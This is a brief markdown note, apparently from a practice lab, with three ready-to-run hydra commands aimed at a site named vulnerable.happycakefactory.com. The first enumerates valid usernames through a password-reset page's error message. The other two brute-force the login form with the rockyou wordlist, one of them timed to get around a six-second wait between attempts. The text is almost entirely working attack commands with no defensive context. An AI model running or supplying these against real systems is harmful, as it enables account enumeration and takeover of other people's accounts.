# Enum user from pass word reset

code to enu username from reset page

```bash

hydra -L cirt-default-usernames.txt -e n -m /pw_reset vulnerable.happycakefactory.com https-post-form  "/pw_reset:username=^USER^:does not exist" -V -I

```
code to enu password from login page

```bash

hydra -l username -P rockyou.txt -t 64 -m /login vulnerable.happycakefactory.com https-post-form "/login:username=^USER^&password=^PASS^:login" -V -I

```

if we want to crack with the 6s time between attemps

```bash
hydra -l username -P rockyou.txt -w 7 -m /login vulnerable.happycakefactory.com https-post-form "/login:username=^USER^&password=^PASS^:login" -v -I

```
